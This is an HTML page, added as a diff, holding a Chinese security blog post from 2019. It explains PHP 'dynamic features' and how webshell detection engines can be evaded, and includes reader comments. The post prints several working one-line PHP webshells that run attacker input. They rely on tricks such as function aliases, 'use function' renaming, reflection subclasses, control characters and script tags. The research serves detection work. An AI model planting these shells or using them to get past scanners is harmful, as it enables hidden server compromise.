@@ -1,0 +1,703 @@
+
+
+<html class="no-js">
+<head>
+    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8" />
+    <meta name="keywords" content="" />
+    <meta name="description" content="phith0n的小站，长期存在与分享关于网络安全与各种编程的原创文章。" />
+    <title>PHP动态特性的捕捉与逃逸 | 离别歌</title>
+    <link rel="alternate" type="application/atom+xml" href="../feed/index.rss" title="离别歌" />
+    <link href="../static/deep/css/base.css" rel="stylesheet" type="text/css" />
+    <link href="../static/deep/css/style.css" rel="stylesheet" type="text/css" />
+    <link rel="shortcut icon" href="../static/deep/images/favicon.ico" />
+    
+<style>div.row .col-xs-4 {
+  float: left;
+  margin-left: 4px;
+}
+div.row .col-xs-4 img {
+  margin-left: 5px;
+}
+</style>
+<link href="https://cdn.staticfile.org/fancybox/2.1.7/css/jquery.fancybox.min.css" rel="stylesheet">
+<link rel="stylesheet" href="../static/deep/css/code.css">
+
+</head>
+<body>
+<!--[if lt IE 8]>
+    <div class="browsehappy" role="dialog">当前网页 <strong>不支持</strong> 你正在使用的浏览器. 为了正常的访问, 请 <a href="http://browsehappy.com/">升级你的浏览器</a>.</div>
+<![endif]-->
+<div id="header">
+    <div class="container">
+        <h1 class="h1-title">
+            <a href="../index.html">
+               <img src="../static/deep/images/logo.png" alt="离别歌" />
+            </a>
+        </h1>
+        <div id="nav">
+        <input type="checkbox" id="button">
+        <label for="button" onclick>菜单</label>
+        
+        <ul>
+            
+            <li class="item ">
+                <a href="../index.html" >首页</a>
+            </li>
+            
+            <li class="item ">
+                <a href="../list/index.html" >文章</a>
+            </li>
+            
+            <li class="item ">
+                <a href="../other/tinger.html" >关于</a>
+            </li>
+            
+            <li class="item ">
+                <a href="../other/friends-link.html" >友链</a>
+            </li>
+            
+            <li class="item ">
+                <a href="https://github.com/phith0n" target="_blank" >项目</a>
+            </li>
+            
+            <li class="item ">
+                <a href="https://www.leavesongs.com/PENETRATION/code-auditor-secret-group.html" target="_blank" >代码审计</a>
+            </li>
+            
+        </ul>
+        
+        </div>
+    </div>
+</div>
+
+<div class="banner-bar">
+    <div class="container">
+        <div class="col-12 columns">
+            <div class="place">
+                <a href="../index.html">首页</a>
+                &raquo;
+                
+                网络安全 &raquo; <a href="dynamic-features-and-webshell-tricks-in-php.html">PHP动态特性的捕捉与逃逸</a>
+                
+            </div>
+        </div>
+    </div>
+</div>
+<div class="container">
+    <div class="col-11 columns" id="mainbody" role="main">
+        <div class="post-single type-post">
+            <h1 class="article-h1">PHP动态特性的捕捉与逃逸</h1>
+            <div class="details-up">
+  <span class="author">作者: phithon</span>
+  
+  <span class="category">分类: <a href="../sort/PENETRATION.html">网络安全</a></span>
+  
+  <span class="date">时间: 2019-12-18 22:19</span>
+  <span class="comments-top" itemprop="interactionCount">评论：<a itemprop="discussionUrl" href="#reply-list">7条评论</a></span>
+  <span class="comments-top" itemprop="interactionCount">浏览：<a itemprop="discussionUrl" href="dynamic-features-and-webshell-tricks-in-php.html">64190人看过</a></span>
+  
+  <span class="date">标签:
+    
+        <a href="../tag/%E5%9B%9E%E8%B0%83%E5%90%8E%E9%97%A8.html">回调后门</a>
+    
+        <a href="../tag/webshell.html">webshell</a>
+    
+  </span>
+  
+</div>
+            <div class="entry">
+                <p>今天看到了某家厂商的Webshell检测引擎，实测效果还可以，确实把PHP Webshell检测这个难题实质上地推进了一步。</p>
+<p>我在八月的KCon中发布了一个议题《<a href="https://github.com/knownsec/KCon/blob/master/2019/25%E6%97%A5/PHP%E5%8A%A8%E6%80%81%E7%89%B9%E6%80%A7%E7%9A%84%E6%8D%95%E6%8D%89%E4%B8%8E%E9%80%83%E9%80%B8.pdf">PHP动态特性的捕捉与逃逸</a>》，一直拖着没时间写文章，结果可能大部分人没有读过，错过了一些有趣的case，所以借此机会，补发一篇文章，看看这些case你有没有考虑到。</p>
+<h2 id="0x01-php"><a class="toclink" href="#0x01-php">0x01 什么是PHP动态特性</a></h2>
+<p><a href="https://phpchip.com">PHPChip</a>是我开源的一款“PHP动态特性”检测工具，那么，什么是动态特性？</p>
+<p>类似于“回调后门”，“PHP动态特性”也是我胡乱起的一个名字。理解动态特性前，借助我幻灯片里的一张图，你们先看看下面的这6个代码中，哪几个和其余部分有区别：</p>
+<p><a href="../media/attachment/2019/12/18/1a8a9c58-bb7b-49fc-847e-933ccc9fe1db.png"><img alt="image.png" src="../media/attachment/2019/12/18/1a8a9c58-bb7b-49fc-847e-933ccc9fe1db.613e99153460.png" /></a></p>
+<p>答案是，我们就可以将上述代码分为两类（实线和虚线）：</p>
+<p><a href="../media/attachment/2019/12/18/ade9327b-3e6c-4aa9-92b1-2c3f9d198a04.png"><img alt="image.png" src="../media/attachment/2019/12/18/ade9327b-3e6c-4aa9-92b1-2c3f9d198a04.a5cd98dec771.png" /></a></p>
+<p>画实线的部分，我们通过阅读其代码，可以确定他们的作用是什么：</p>
+<ul>
+<li><code>preg_replace('/a/i', 'b', $_POST['name']);</code> 替换用户输入的字符串中的a为b</li>
+<li><code>echo "hello world";</code> 输出字符串“hello world”</li>
+<li><code>foreach (dir('./') as $f) {echo $f-&gt;read();}</code> 读取并输出当前目录下所有文件名</li>
+</ul>
+<p>画虚线的部分，我们其实是无法完全确定功能的。</p>
+<p>比如这段代码：</p>
+<div class="codehilite"><pre><span></span><code><span class="nv">$arr</span> <span class="o">=</span> <span class="p">[</span><span class="nv">$_GET</span><span class="p">,</span> <span class="nv">$_POST</span><span class="p">,</span> <span class="nv">$_COOKIE</span><span class="p">];</span>
+<span class="nb">array_map</span><span class="p">(</span><span class="nv">$callback</span><span class="p">,</span> <span class="o">...</span><span class="nv">$arr</span><span class="p">);</span>
+</code></pre></div>
+
+<p>在<code>$callback</code>的值为<code>htmlspecialchars</code>时，作用是处理并编码用户的输入：</p>
+<div class="codehilite"><pre><span></span><code><span class="nb">array_map</span><span class="p">(</span><span class="s1">&#39;htmlspecialchars&#39;</span><span class="p">,</span> <span class="o">...</span><span class="nv">$arr</span><span class="p">);</span>
+</code></pre></div>
+
+<p>在<code>$callback</code>的值为<code>assert</code>时，将会变成一个webshell：</p>
+<div class="codehilite"><pre><span></span><code><span class="nb">array_map</span><span class="p">(</span><span class="s1">&#39;assert&#39;</span><span class="p">,</span> <span class="o">...</span><span class="nv">$arr</span><span class="p">);</span>
+</code></pre></div>
+
+<p>这就是PHP的动态特性。我们用一段简单的语言描述：<strong>“一段代码，其中变量值的改变可能导致这段代码发生功能上的变化，我将这种现象成为 PHP的动态特性”</strong>。</p>
+<p>几乎可以肯定地说，所有的一句话Webshell都需要使用到动态特性，因为一句话木马的作用就是通过一段简单的代码可以执行攻击者想要的很多功能。</p>
+<p>不过，具有动态特性的代码又不代表就一定是Webshell，也可能只是开发者借助PHP灵活的特性编写的正常代码。在实际开发中，我们应该尽量避免使用过多动态特性，还记得ThinkPHP5曾经出现过的两个远程代码执行漏洞吗？</p>
+<p>这两个漏洞都是开发者使用动态方法调用的时候，没有注意控制方法的命令，导致用户调用了恶意函数，最终导致代码执行。</p>
+<p>PHPChip的作用，就是帮助开发者和运维安全人员，快速定位项目中的动态特性，并进行修正。</p>
+<h2 id="0x02"><a class="toclink" href="#0x02">0x02 检测与对抗</a></h2>
+<p>既然已经开源，我就不过多描述Chip的工作原理了，这篇文章重点还是讲讲对抗。</p>
+<p>既然一句话木马可以理解为PHP动态特性，那么PHPChip理论上就可以找到所有一句话木马。</p>
+<p>我将我们常见的PHP一句话木马分为如下几个类别：</p>
+<p><a href="../media/attachment/2019/12/18/5a649cd6-fea7-4a08-a42b-8e0dae6b41b3.png"><img alt="image.png" src="../media/attachment/2019/12/18/5a649cd6-fea7-4a08-a42b-8e0dae6b41b3.77b11cb4196a.png" /></a></p>
+<p>直接型是最常见的eval、assert类型的一句话木马；变形型通常是编码、加密、压缩PHP文件，或者通过一些动态方法调用实现的一句话木马；回调型是我曾经说过的<a href="php-callback-backdoor.html">回调后门</a>；命令型指的是通过命令执行函数或反引号来执行用户输入的参数，外国人喜欢这类后门；包含型通常会将恶意代码放在另一个文件中，然后进行包含利用，避免被查杀；技巧型则利用了一些PHP的tricks，制造任意代码执行。</p>
+<p>这些后门都已经被各大厂商熟知，所以通常也无法逃过Webshell检测。我在写PHPChip的时候，首先针对这些常见的动态特性进行了检测，但是在检测的过程中，也研究出了不少有趣的新“tricks”。</p>
+<h3 id="_1"><a class="toclink" href="#_1">攻击者的小试牛刀</a></h3>
+<p>我们从回调后门这种我曾专门写过博客的后门入手进行分析吧，先思考，针对一个回调型后门，检测引擎会如何进行检测：</p>
+<p>1.遍历AST Tree</p>
+<p>2.分析FuncCall Node，判断是否调用了含有“回调参数”的函数</p>
+<p>3.判断回调参数是否是一个变量</p>
+<p>其实检测的最关键一点，就是你如何确定代码中的某一个函数是一个“恶意”函数？</p>
+<p>简单来说，检测引擎应该有个黑名单，在找到函数调用的代码时，如果发现函数名在黑名单中，就认为这是一个“敏感”函数，再执行后续判断；如果函数名不在黑名单中，那么后续的判断也就不用继续了。</p>
+<p>对于一个安全研究者，判断黑名单最简单的绕过，当然就是改变大小写。虽然大部分编程语言的关键字都是大小写敏感的，但PHP是一个例外，比如，我们可以将基础的回调后门修改为如下：</p>
+<div class="codehilite"><pre><span></span><code><span class="nx">UsORt</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="mi">1</span><span class="p">],</span> <span class="nv">$_POST</span><span class="p">[</span><span class="mi">2</span><span class="p">]);</span>
+</code></pre></div>
+
+<p>如果比较弱智的检测引擎没有区分大小写，即可绕过。</p>
+<h3 id="_2"><a class="toclink" href="#_2">绕过马其顿防线</a></h3>
+<p>显然大部分检测引擎不会这么弱智。</p>
+<p>那么，我们继续思考。如果说检测引擎有一个“敏感函数”的黑名单，那么这个黑名单怎么来？多半有如下两个途径：</p>
+<ul>
+<li>根据经验</li>
+<li>从文档采集</li>
+</ul>
+<p>经验显然是不靠谱的，很少有人能完全掌握PHP中所有的函数原型。从文档采集是个比较靠谱的方法，我们只需要遍历整个PHP的文档，找到函数回调函数参数的函数就行了。</p>
+<p>比如，<code>usort</code>这个函数原型如下：</p>
+<p><a href="../media/attachment/2019/12/18/e9c1279f-0f3c-43f6-80bd-2ded06fc2438.png"><img alt="image.png" src="../media/attachment/2019/12/18/e9c1279f-0f3c-43f6-80bd-2ded06fc2438.0511929622fb.png" /></a></p>
+<p>其第二个参数是一个<code>callable</code>类型的参数，我们可以传入回调函数，最后构造成回调后门。</p>
+<p>那么，文档真的是完全靠谱的吗？</p>
+<p>在PHP底层中，有一个宏叫<code>PHP_FALIAS</code>，作用是给一个函数赋予一个“别名”，比如<code>show_source</code>函数就是<code>highlight_file</code>的别名。我们可以在源码中找到这些别名函数：</p>
+<p><a href="../media/attachment/2019/12/18/8e7adfcb-be67-4103-9798-c17e0c472319.png"><img alt="image.png" src="../media/attachment/2019/12/18/8e7adfcb-be67-4103-9798-c17e0c472319.bfe3c23a3dd9.png" /></a></p>
+<p>其中有两个有趣的函数：</p>
+<ul>
+<li><code>mbereg_replace</code></li>
+<li><code>mbereg_ireplace</code></li>
+</ul>
+<p>他们在文档里搜索不到，实际上却是<code>mb_ereg_replace</code>、<code>mb_eregi_replace</code>的别名：</p>
+<p><a href="../media/attachment/2019/12/18/a140907f-0956-406a-a4cc-ca61f817437f.png"><img alt="image.png" src="../media/attachment/2019/12/18/a140907f-0956-406a-a4cc-ca61f817437f.41d2ce1ce801.png" /></a></p>
+<p>而<code>mb_ereg_replace</code>、<code>mb_eregi_replace</code>这两个函数你记得吗？他们的作用和<code>preg_replace</code>一样，支持传入<code>e</code>模式的正则表达式，进而执行任意代码；而且，PHP7后已经删除了<code>preg_replace</code>的<code>e</code>模式，而<code>mb_ereg_replace</code>的<code>e</code>模式仍然坚挺到现在。</p>
+<p>所以，我们可以构造如下代码，绕过很多Webshell检测引擎：</p>
+<div class="codehilite"><pre><span></span><code><span class="nx">mbereg_replace</span><span class="p">(</span><span class="s1">&#39;.*&#39;</span><span class="p">,</span> <span class="s1">&#39;\0&#39;</span><span class="p">,</span> <span class="nv">$_REQUEST</span><span class="p">[</span><span class="mi">2333</span><span class="p">],</span> <span class="s1">&#39;mer&#39;</span><span class="p">);</span>
+</code></pre></div>
+
+<p>另外，有的Webshell检测引擎发现单独的<code>e</code>会进行报警，但换成一个包含<code>e</code>的字符串，就不会报警了，很有趣。</p>
+<p>不过，<code>mbereg_replace</code>这个别名在PHP7.3被移除了，所以上述代码只能在7.2及以下的PHP中使用。</p>
+<h3 id="_3"><a class="toclink" href="#_3">剑走偏锋</a></h3>
+<p>从函数名入手，我们刚才找到了两种可能绕过Webshell检测引擎的方法，那么继续思考，还有哪些从函数名位置可以突破的方法？</p>
+<p>这里就提到一个新的姿势了，在PHP5.6以后，PHP开始支持函数别名。</p>
+<p>什么是函数别名？比如，两个开发者开发了不同的组件，但其中都包含<code>sample</code>这个函数，在旧的PHP中，遇到这种情况就会报一个致命错误：</p>
+<blockquote>
+<p>PHP Fatal error: Cannot redeclare sample()</p>
+</blockquote>
+<p>虽然命名空间这个概念在PHP5.3就引入了，但一直只支持类名的命名空间，直到PHP5.6才加入了函数名的命名空间。</p>
+<p>此时，我们就可以用<code>use function a as b</code>来导入函数<code>a</code>，但在当前命名空间中以<code>b</code>来命名。在表现形式上来看，就类似于我将函数“重命名”了。</p>
+<p>所以，我们可以将<code>assert</code>函数重命名，来构造一个一句话木马：</p>
+<div class="codehilite"><pre><span></span><code><span class="k">use</span> <span class="k">function</span> <span class="nf">\assert</span> <span class="k">as</span> <span class="nx">test</span><span class="p">;</span>
+
+<span class="nx">test</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="mi">2333</span><span class="p">]);</span>
+</code></pre></div>
+
+<p>在8月发表议题时，这个Webshell几乎没有检测引擎支持。</p>
+<h3 id="_4"><a class="toclink" href="#_4">举一反三</a></h3>
+<p>我们刚才研究了“重命名”函数造成的绕过，思考一下，还有哪些行为，我们可以认为也是在“重命名”？</p>
+<p>很简单，类的继承，其实也可以理解为一种“重命名”。子类拥有父类所有的方法，也可以做所有父类支持的操作。</p>
+<p>构造一个简单的Webshell：</p>
+<div class="codehilite"><pre><span></span><code><span class="k">class</span> <span class="nc">test</span> <span class="k">extends</span> <span class="nx">ReflectionFunction</span> <span class="p">{}</span>
+<span class="nv">$f</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">test</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;name&#39;</span><span class="p">]);</span>
+<span class="nv">$f</span><span class="o">-&gt;</span><span class="na">invoke</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="mi">2333</span><span class="p">]);</span>
+</code></pre></div>
+
+<p>用php7支持的匿名类的方式修改这段代码：</p>
+<div class="codehilite"><pre><span></span><code><span class="nv">$f</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">class</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;name&#39;</span><span class="p">])</span> <span class="k">extends</span> <span class="nx">ReflectionFunction</span> <span class="p">{};</span>
+<span class="nv">$f</span><span class="o">-&gt;</span><span class="na">invoke</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="mi">2333</span><span class="p">]);</span>
+</code></pre></div>
+
+<h3 id="_5"><a class="toclink" href="#_5">待时而动</a></h3>
+<p>我们刚才找到了利用函数名、类名的一些方法，那么，利用参数名位置，是否也可以构造Webshell呢？</p>
+<p>在我的另一篇文章《<a href="../PHP/bypass-eval-length-restrict.html">eval长度限制绕过 &amp;&amp; PHP5.6新特性</a>》提出过利用PHP5.6后增加的变长参数来绕过代码执行的长度限制，当然也可以用来绕过Webshell的检测：</p>
+<div class="codehilite"><pre><span></span><code><span class="nb">usort</span><span class="p">(</span><span class="o">...</span><span class="nv">$_GET</span><span class="p">);</span>
+</code></pre></div>
+
+<p>不过，因为已经提出2年有余，如今大部分的检测引擎已经有针对性防御了，所以这里就不再赘述。</p>
+<h3 id="_6"><a class="toclink" href="#_6">敌后武工队</a></h3>
+<p>继续思考，你是如何判断一段代码里，哪些位置是函数名，哪些位置是类名，哪些位置是参数？</p>
+<p>在PHPChip中，我们用到了PHP-Parser这个PHP的AST解释引擎，相比于针对Opcode的检测，其优点是适配所有主流PHP版本，缺点是与正常的PHP引擎还是有一些区别。</p>
+<p>比如，如果你抓过菜刀的数据包，你会发现其PHP代码中会包含很多控制字符。比如，一个函数调用，我们可以在括号前面增加控制字符：</p>
+<div class="codehilite"><pre><span></span><code><span class="err">printf&lt;char&gt;(&#39;hello world&#39;)</span>
+</code></pre></div>
+
+<p>哪些字符是控制字符呢？</p>
+<div class="codehilite"><pre><span></span><code><span class="err">[\x00-\x20]</span>
+</code></pre></div>
+
+<p>PHP引擎会忽略这些控制字符，正确执行PHP函数；而PHP-Parser是无法正确解析的这些包含控制字符的函数的。</p>
+<p>所以，如果我们构造如下代码，即可绕过一些具有语法解析的Webshell检测引擎：</p>
+<div class="codehilite"><pre><span></span><code><span class="k">eval</span><span class="nx">\x01\x02</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="mi">2333</span><span class="p">]);</span>
+</code></pre></div>
+
+<p>其中<code>\x01\x02</code>需要转换成实际的字符。</p>
+<h3 id="_7"><a class="toclink" href="#_7">暗度陈仓</a></h3>
+<p>继续思考，我们刚才借助了AST解析器PHP-Parser与实际PHP的差异来绕过检测，实际上还是进行了检测，只不过因为解析代码出现不认识的字符导致退出了检测。</p>
+<p>那么，我们能不能直接不让解析器进行解析呢？</p>
+<p>一个正常的解析器，其流程是什么？</p>
+<p>1.在用户传入的内容中，找到PHP代码</p>
+<p>2.将PHP代码解析成AST Tree</p>
+<p>第1步需要先找到PHP代码吧，那么，如何界定一段代码是不是PHP代码？当然是根据<strong>PHP标签</strong>。</p>
+<p>在正常PHP5中，支持如下4种PHP标签：</p>
+<p><a href="../media/attachment/2019/12/18/df258c5c-cbdb-40b2-a173-6d6497025057.png"><img alt="image.png" src="../media/attachment/2019/12/18/df258c5c-cbdb-40b2-a173-6d6497025057.8e8cf510c16c.png" /></a></p>
+<p>而PHP-Parser只支持前两个标签，这就导致了差异。如果我传入一个由<code>&lt;script&gt;</code>标签构造的Webshell，不识别该标签的检测引擎就会出现绕过：</p>
+<div class="codehilite"><pre><span></span><code><span class="o">&lt;</span><span class="nx">script</span> <span class="nx">language</span><span class="o">=</span><span class="s2">&quot;php&quot;</span><span class="o">&gt;</span>
+  <span class="k">eval</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="mi">2333</span><span class="p">]);</span>
+<span class="o">&lt;/</span><span class="nx">script</span><span class="o">&gt;</span>
+</code></pre></div>
+
+<h2 id="0x03"><a class="toclink" href="#0x03">0x03 总结</a></h2>
+<p>除了上述说到的一些代码，其实按照这些思路还能想出很多有趣的tricks，这里我就先保密了。希望大家不再拘泥于通过各种方法获取输入，增加调用链，结果最后还得用一个大大的eval；也不再拘泥于编码、加密、压缩、动态调用这样的方式来变换自己的代码，脑洞还可以更大一些。</p>
+<p>以上内容是我在8月的KCON中发布的议题《PHP动态特性的捕捉与逃逸》，可能有些人注意到并进行了针对性防御，估计也有不少人没有看过。原谅我这篇迟到的文章，希望给你们带来一些其他灵感。</p>
+            </div>
+            <div itemprop="keywords" class="tags-meta">
+                标签:
+                
+                    <a href="../tag/%E5%9B%9E%E8%B0%83%E5%90%8E%E9%97%A8.html">回调后门</a>
+                
+                    <a href="../tag/webshell.html">webshell</a>
+                
+            </div>
+            <br>
+<!--MOB SHARE BEGIN-->
+<div class="-mob-share-ui-button -mob-share-open">分享</div>
+<div class="-mob-share-ui" style="display: none">
+    <ul class="-mob-share-list">
+        <li class="-mob-share-weibo"><p>新浪微博</p></li>
+        <li class="-mob-share-qzone"><p>QQ空间</p></li>
+        <li class="-mob-share-qq"><p>QQ好友</p></li>
+        <li class="-mob-share-weixin"><p>微信</p></li>
+        <li class="-mob-share-douban"><p>豆瓣</p></li>
+        <li class="-mob-share-facebook"><p>Facebook</p></li>
+        <li class="-mob-share-twitter"><p>Twitter</p></li>
+        <li class="-mob-share-pocket"><p>Pocket</p></li>
+        <li class="-mob-share-google"><p>Google+</p></li>
+        <li class="-mob-share-youdao"><p>有道云笔记</p></li>
+        <li class="-mob-share-mingdao"><p>明道</p></li>
+        <li class="-mob-share-tumblr"><p>Tumblr</p></li>
+        <li class="-mob-share-instapaper"><p>Instapaper</p></li>
+        <li class="-mob-share-linkedin"><p>LinkedIn</p></li>
+    </ul>
+    <div class="-mob-share-close">取消</div>
+</div>
+<div class="-mob-share-ui-bg"></div>
+<script id="-mob-share" src="https://f1.webshare.mob.com/code/mob-share.js?appkey=af155d9007c8"></script>
+<!--MOB SHARE END-->
+
+        <div class="qqlist">
+          <h3>订阅本站<small>(RSS)</small></h3>
+          <form method="post" target="_blank" action="https://list.qq.com/cgi-bin/qf_compose_send">
+          <input type="hidden" value="qf_booked_feedback" name="t" />
+          <input type="hidden" value="dace5c2b356504de449e7f3fc2bb59f3f6124d6563786446" name="id" />
+          <input type="text" placeholder="E-mail" value="" class="rsstxt" name="to" id="to" />
+          <button type="submit" >订阅&rarr;</button>
+          </form>
+        </div>
+
+
+        </div>
+
+        
+        <div class="post-single type-post text-center">
+            <h3 style="margin-top: 0">喜欢这篇文章，扫码和我成为赞友！</h3>
+            <img src="../static/wx.jpg" width="280" alt="">
+        </div>
+        
+
+        <!-- 评论位置 -->
+        <div id="comments" class="comments">
+          <h3>已有 7 条评论</h3>
+            <ol class="comment-list">
+            
+            
+              <li class="comment-body" id="comment-3496">
+                <div class="clearfix">
+                    <div class="comment-author">
+                        <img src="../static/placeholder.jpg">
+                    </div>
+                    <div class="comment-meta">
+                    <div class="fn"><a href="" target="_blank" rel="nofollow noopener">Cyc1e</a></div>
+                    <p>这个可以拓展到其他的脚本语言呀，webshell都涉及到函数的动态调用，不过准确的检测会有点麻烦吧？正常文件会造成很大的干捞</p>
+                    <span class="comment-time">时间: 2020-03-30 20:43</span>
+                    <span class="comment-reply"><a href="#comment-3496" onclick="reply_to('3496','Cyc1e')">回复</a></span>
+                    </div>
+                </div>
+              </li>
+            
+              <li class="comment-body" id="comment-3468">
+                <div class="clearfix">
+                    <div class="comment-author">
+                        <img src="https://secure.gravatar.com/avatar/cfe2357e62bb5849b33c65e97a53f25e.jpg?s=100&amp;d=mm&amp;r=g">
+                    </div>
+                    <div class="comment-meta">
+                    <div class="fn"><a href="" target="_blank" rel="nofollow noopener">xsshim</a></div>
+                    <p>其中\x01\x02需要转换成实际的字符， 这句话是怎么理解呢？ 我使用16进制转换，没办法转成字符哦</p>
+                    <span class="comment-time">时间: 2020-01-13 16:36</span>
+                    <span class="comment-reply"><a href="#comment-3468" onclick="reply_to('3468','xsshim')">回复</a></span>
+                    </div>
+                </div>
+              </li>
+            
+              <li class="comment-body" id="comment-3470">
+                <div class="clearfix">
+                    <div class="comment-author">
+                        <img src="https://secure.gravatar.com/avatar/c4267eb6d17276fa31c547ac71611e90.jpg?s=100&amp;d=mm&amp;r=g">
+                    </div>
+                    <div class="comment-meta">
+                    <div class="fn"><a href="../index.html" target="_blank" rel="nofollow noopener">phithon</a></div>
+                    <p>@xsshim <br>有时候眼睛看不到的字符，不代表就不存在。</p>
+                    <span class="comment-time">时间: 2020-01-13 17:14</span>
+                    <span class="comment-reply"><a href="#comment-3470" onclick="reply_to('3470','phithon')">回复</a></span>
+                    </div>
+                </div>
+              </li>
+            
+              <li class="comment-body" id="comment-3459">
+                <div class="clearfix">
+                    <div class="comment-author">
+                        <img src="../static/placeholder.jpg">
+                    </div>
+                    <div class="comment-meta">
+                    <div class="fn"><a href="http://www.cnpanda.net" target="_blank" rel="nofollow noopener">panda</a></div>
+                    <p>总结一下就是一下几个ticks:<br>1、利用别名来构造一句话<br>2、利用重命名来构造一句话（use function a as b以及继承）<br>3、利用参数名位置来构造一句话<br>4、利用控制字符来绕过检测构造一句话<br>5、利用PHP标签识别差异来构造一句话<br>这些技巧和拼接字符串、反转字符串混下，感觉很难检测出来，太灵活了<br>这要做甲方的检测，太难了</p>
+                    <span class="comment-time">时间: 2019-12-19 17:49</span>
+                    <span class="comment-reply"><a href="#comment-3459" onclick="reply_to('3459','panda')">回复</a></span>
+                    </div>
+                </div>
+              </li>
+            
+              <li class="comment-body" id="comment-3457">
+                <div class="clearfix">
+                    <div class="comment-author">
+                        <img src="https://secure.gravatar.com/avatar/b642b4217b34b1e8d3bd915fc65c4452.jpg?s=100&amp;d=mm&amp;r=g">
+                    </div>
+                    <div class="comment-meta">
+                    <div class="fn"><a href="" target="_blank" rel="nofollow noopener">test</a></div>
+                    <p>openRasp,直接插桩，你的playload无法执行任你玩成花,只有逃逸出进程，利用函数执行底层shellcode才是王道</p>
+                    <span class="comment-time">时间: 2019-12-19 11:54</span>
+                    <span class="comment-reply"><a href="#comment-3457" onclick="reply_to('3457','test')">回复</a></span>
+                    </div>
+                </div>
+              </li>
+            
+              <li class="comment-body" id="comment-3458">
+                <div class="clearfix">
+                    <div class="comment-author">
+                        <img src="https://secure.gravatar.com/avatar/c4267eb6d17276fa31c547ac71611e90.jpg?s=100&amp;d=mm&amp;r=g">
+                    </div>
+                    <div class="comment-meta">
+                    <div class="fn"><a href="../index.html" target="_blank" rel="nofollow noopener">phithon</a></div>
+                    <p>@test <br>你估计不了解甲方，真正能上rasp的厂有几个？</p>
+                    <span class="comment-time">时间: 2019-12-19 11:57</span>
+                    <span class="comment-reply"><a href="#comment-3458" onclick="reply_to('3458','phithon')">回复</a></span>
+                    </div>
+                </div>
+              </li>
+            
+              <li class="comment-body" id="comment-3460">
+                <div class="clearfix">
+                    <div class="comment-author">
+                        <img src="../static/placeholder.jpg">
+                    </div>
+                    <div class="comment-meta">
+                    <div class="fn"><a href="" target="_blank" rel="nofollow noopener">master</a></div>
+                    <p>@phithon 说得没错, 性能影响和推动部署都是难题</p>
+                    <span class="comment-time">时间: 2019-12-20 09:37</span>
+                    <span class="comment-reply"><a href="#comment-3460" onclick="reply_to('3460','master')">回复</a></span>
+                    </div>
+                </div>
+              </li>
+            
+            
+            </ol>
+            
+        </div>
+
+        <div id="reply"></div>
+        <div id="comment-place">
+            <div id="comment-post" class="respond none-resize">
+             <div id="respond">
+                <h3 id="response">添加新评论</h3>
+                <form method="post" id="comment-form" role="form" action="#comments">
+                    <p>
+                        <label for="author" class="required">称呼</label>
+                        <input type="text" name="nickname" placeholder="昵称" maxlength="64" required id="id_nickname">
+                    </p>
+                    <p>
+                        <label for="mail">Email</label>
+                        <input type="text" name="email" placeholder="邮箱（可留空）" maxlength="254" id="id_email">
+                    </p>
+                    <p>
+                        <label for="url">网站</label>
+                        <input type="text" name="url" placeholder="链接（可留空）" maxlength="200" id="id_url">
+                    </p>
+                    <p>
+                        <label for="textarea" class="required">内容</label>
+                        <textarea name="content" cols="40" rows="6" required id="id_content">
+</textarea>
+                    </p>
+                    <p>
+                        <label style="float:left;">验证码</label>
+                        <div class="row gx-2" style="margin-top: 8px"><div class="col-6"><input autocomplete="off" id="id_captcha_1" name="captcha_1" type="text" placeholder="验证码" /> <input id="id_captcha_0" name="captcha_0" type="hidden" value="9cee275431b63e54273e159d1ed80d01652a62a6" />
+</div><div class="col-6">
+<img src="../captcha/image/9cee275431b63e54273e159d1ed80d01652a62a6/index.png" alt="captcha" class="captcha" /></div></div>
+                    </p>
+                    <p>
+                        <button type="submit" class="submit">提交评论</button>
+                        <input type="hidden" name="parent" id="id_parent">
+                        <input type="hidden" name="archive" value="449" id="id_archive">
+                        <input type="hidden" name="csrfmiddlewaretoken" value="1hHrkDNw3Qkx9i8VIrrsaTaJve129RxbNP5iSIofrcygHQWjKsod7mdOQBidItJt">
+                    </p>
+                </form>
+                </div>
+            </div>
+        </div>
+
+    </div>
+    
+
+
+
+<div  class="col-5 columns" id="sidebar" role="complementary">
+
+  <div class="widget widget_search">
+    <h3>搜索</h3>
+    <form action="https://www.leavesongs.com/search/" id="searchform" method="get">
+        <input type="text" id="searchkey" name="keyword" value="" class="searchkey" placeholder="Search..."/>
+        <button type="submit"  id="searchsubmit">Go</button>
+    </form>
+  </div>
+
+  
+  <div class="widget">
+	<h3 class="widget-title">最新评论</h3>
+	<ul class="widget-list" id="recent-comment">
+    
+    
+        <li id="comment" class="clearfix">
+            <img class="avatar" src="../static/placeholder.jpg" alt="%s" width="40" height="40">
+            <div class="comments-link"><cite>木木</cite>：<a href="../THINK/europe-trip-2022.html#comment-4523">虽然物价对比不出什么，但是还是觉得很高昂</a></div>
+        </li>
+    
+        <li id="comment" class="clearfix">
+            <img class="avatar" src="../static/placeholder.jpg" alt="%s" width="40" height="40">
+            <div class="comments-link"><cite>dongdong4fei</cite>：<a href="../THINK/using-chatgpt-for-antispam.html#comment-4520">肯德基疯狂星期四！ 疯狂星期四！  https://m.kfc.com.cn/wechatco...</a></div>
+        </li>
+    
+        <li id="comment" class="clearfix">
+            <img class="avatar" src="../static/placeholder.jpg" alt="%s" width="40" height="40">
+            <div class="comments-link"><cite>dongdong4fei</cite>：<a href="../THINK/using-chatgpt-for-antispam.html#comment-4519">小猪咪小猪咪小猪咪</a></div>
+        </li>
+    
+        <li id="comment" class="clearfix">
+            <img class="avatar" src="../static/placeholder.jpg" alt="%s" width="40" height="40">
+            <div class="comments-link"><cite>sam</cite>：<a href="javascript-prototype-pollution-attack.html#comment-4518">还得是P神，文章一看就懂</a></div>
+        </li>
+    
+        <li id="comment" class="clearfix">
+            <img class="avatar" src="../static/placeholder.jpg" alt="%s" width="40" height="40">
